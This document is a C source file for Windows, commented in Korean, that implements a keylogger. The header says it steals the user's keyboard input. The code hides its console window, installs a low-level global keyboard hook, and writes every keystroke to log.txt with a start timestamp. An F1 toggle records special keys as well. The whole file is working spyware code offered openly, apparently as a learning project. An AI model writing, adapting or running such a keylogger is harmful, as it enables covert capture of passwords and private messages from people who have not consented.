/* 키로깅 프로그램
* 
* 기능1: 사용자의 키보드 입력 탈취
*  사용자가 입력하는 키보드 메시지 값을 후킹하여 log.txt파일로 저장한다.
*  (한글 지원x)
* 
* 기능2: 특수 키 기록 모드 탑재
*  F1키를 눌러 log.txt 파일에 문자가 아닌 특수 키(ex: shift, enter…) 입력 값을 저장할 것인지 결정할 수 있다.
*  프로그램은 특수 키 기록 모드가 꺼진 상태로 시작된다. F1키를 누르면 특수 키 기록 모드를 전환할 수 있다.
*  특수 키 기록 모드가 켜져 있는 경우, log.txt 파일에 특수 키 입력 값이 "[특수 키]"와 같은 문자로 저장된다.
*  예를 들어, enter 키를 누를 경우 "[enter]"가 파일에 저장된다.
*  특수 키 기록 모드가 꺼져 있는 경우, enter, tab과 같은 특수 키는 "\n", "\t"와 같은 문자로 저장되고,
*  shift, ctrl과 같이 별도의 입력값이 없는 특수키는 저장되지 않는다.
* 
*/

#include <stdio.h>
#include <Windows.h>
#include <time.h>
#include <locale.h>

int specialFlag = 0;   //specialFlag==1이면 파일에 특수 키 기록
int shiftFlag = 0; //shift 키가 눌린 상태이면 shiftFlag == 1

//파일 출력
void writeFile(char* word) {
    FILE* file;
    //파일 열기
    errno_t err = fopen_s(&file, "log.txt", "a");
    if (err != 0 || file == NULL) {
        printf("파일을 열 수 없습니다.");
        return;
    }
    //파일에 쓰기
    fputs(word, file);
    //출력 버퍼 지우기
    fflush(file);
    //파일 닫기
    fclose(file);
}

char* getTime() {
    time_t t;
    time(&t);

    struct tm timeinfo;
    localtime_s(&timeinfo, &t);

    static char currentTime[50];
    strftime(currentTime, sizeof(currentTime), "%Y-%m-%d %H:%M:%S", &timeinfo);

    return currentTime;
}

//특수 키 기록 모드 전환 함수
void onOffSpecialKeyMode() {
    if (specialFlag == 1) { //특수 키 기록 모드가 켜져 있을 경우
        specialFlag = 0;    //OFF함
        writeFile("\n[특수 키 기록 모드: OFF]\n");
    }
    else {  //특수 키 기록 모드가 꺼져 있을 경우
        specialFlag = 1;    //ON함
        writeFile("\n[특수 키 기록 모드: ON]\n");
    }
}

//특수 키 기록 모드 ON 시의 특수 키 처리
int isSpecialKeyMode(DWORD keyCode) {
    switch (keyCode) {
    case VK_SPACE:  //Spacebar
        writeFile("[Space]");
        break;
    case VK_BACK:   //Backspace
        writeFile("[Backspace]");
        break;
    case VK_TAB:    //tab
        writeFile("[Tab]");
        break;
    case VK_RETURN: //enter(파일의 가독성을 위해 '\n'을 함께 출력하도록 함.)
        writeFile("[Enter]\n");
        break;
    case VK_SHIFT:  //shift
    case VK_RSHIFT:
    case VK_LSHIFT:
        writeFile("[Shift]");
        break;
    case VK_RCONTROL:   //ctrl
    case VK_LCONTROL:
    case VK_CONTROL:
        writeFile("[Ctrl]");
        break;
    case VK_MENU:   //alt
    case VK_LMENU:
    case VK_RMENU:
        writeFile("[Alt]");
        break;
    case VK_ESCAPE: //esc
        writeFile("[Esc]");
        break;
    default:
        return 1;
    }

    return 0;
}

//특수 키 기록 모드 OFF 시의 특수 키 처리
int isNotSpecialKeyMode(DWORD keyCode) {
    switch (keyCode) {
    case VK_SPACE:  //스페이스바
        writeFile(" ");
        break;
    case VK_BACK:   //backspace
        writeFile("\b");
        break;
    case VK_TAB:    //tab
        writeFile("\t");
        break;
    case VK_RETURN: //enter
        writeFile("\n");
        break;
    //별도의 입력 값이 없는 특수 키의 경우 처리하지 않고 넘김
    case VK_HANGUL:
    case VK_SHIFT:
    case VK_CONTROL:
    case VK_MENU:
    case VK_CAPITAL:
    case VK_ESCAPE:
    case VK_LMENU:
    case VK_RMENU:
    case VK_RCONTROL:
    case VK_LCONTROL:
    case VK_RSHIFT:
    case VK_LSHIFT:
        break;
    default:
        return 1;
    }

    return 0;
}

//키보드 메시지 후킹
LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD keyCode = kbStruct->vkCode;   //처리 중인 key의 가상 키 코드
        int isNotSpecialKey;    //처리 중인 key가 특수 키가 아니면 isNotSpecialKey = 1

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            //ESC 키 입력 시 종료
            if (keyCode == VK_ESCAPE) { 
                PostQuitMessage(0);
            }
            //특수 키 기록 모드 설정
            if (keyCode == VK_F1) {
                onOffSpecialKeyMode();
            }
            if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                shiftFlag = 1;
            }

            //특수 키 기록 모드에 따른 특수 키 처리 함수 실행
            if (specialFlag == 1) isNotSpecialKey = isSpecialKeyMode(keyCode); 
            else isNotSpecialKey = isNotSpecialKeyMode(keyCode);

            if (isNotSpecialKey) {  //처리 중인 키가 특수 키가 아닐 경우
                // 기타 문자 또는 알파벳 등을 처리
                BYTE keyboardState[256] = { 0 };
                if (GetKeyboardState(keyboardState)) {
                    WCHAR unicodeKey[2] = { 0 };                    
                    if (ToUnicodeEx(keyCode, kbStruct->scanCode, keyboardState, unicodeKey, 2, 0, GetKeyboardLayout(0)) > 0) {
                        char charKey[3] = { 0 }; // 변환한 문자를 저장할 배열
                        WideCharToMultiByte(CP_UTF8, 0, unicodeKey, -1, charKey, 3, NULL, NULL);                        
                        if (((GetKeyState(VK_CAPITAL) & 0x0001) && !shiftFlag) || shiftFlag) {
                            charKey[0] = toupper(charKey[0]);
                            shiftFlag = 0;
                        }
                        writeFile(charKey);
                    }                   
                }
            }
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    //백그라운드 실행
    HWND hWnd = GetForegroundWindow();
    ShowWindow(hWnd, SW_HIDE);

    //키보드 후킹 설정
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, NULL, 0);
    if (hook == NULL) {
        return 1;
    }

    setlocale(LC_ALL, "");

    writeFile("\n\t>>기록 시작");
    writeFile(getTime());
    writeFile("\n[특수 키 기록 모드: OFF]\n");

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) != 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);

    return 0;
}
